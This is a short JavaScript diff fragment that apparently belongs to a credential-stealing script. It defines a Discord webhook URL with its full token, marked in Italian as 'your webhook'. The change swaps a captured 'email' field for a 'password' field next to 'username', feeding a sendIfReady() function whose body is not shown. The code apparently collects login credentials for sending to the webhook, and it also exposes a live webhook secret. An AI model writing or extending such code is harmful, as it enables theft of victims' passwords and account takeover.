@@ -2,7 +2,7 @@
   const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1464590647976788000/hb-LppvtKxCE8kAQiiah65ve0vUaq_W9wOIB2jIE_2H4OOEp2wyEV3lMDDj3nsLIWZ8H'; // <-- TUO WEBHOOK
 
   let username = null;
-  let email = null;
+  let password = null;
   let sent = false;
 
   function sendIfReady() {
